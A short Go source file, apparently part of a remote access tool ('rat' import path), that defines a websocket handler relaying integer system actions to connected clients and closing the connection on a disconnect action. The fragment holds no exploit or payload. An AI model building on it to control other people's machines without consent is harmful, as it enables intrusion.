package main

import (
	"encoding/json"
	"rat/common/system"

	"time"

	"golang.org/x/net/websocket"
)

type SysMessage Message

func (sys SysMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	var action int

	err := json.Unmarshal([]byte(data), &action)
	if err != nil {
		return err
	}

	client.Queue <- SysPacket{system.Action(action)}

	if action == int(system.Disconnect) {
		go func() {
			time.Sleep(time.Second)
			client.Conn.Close()
		}()
	}

	return nil
}
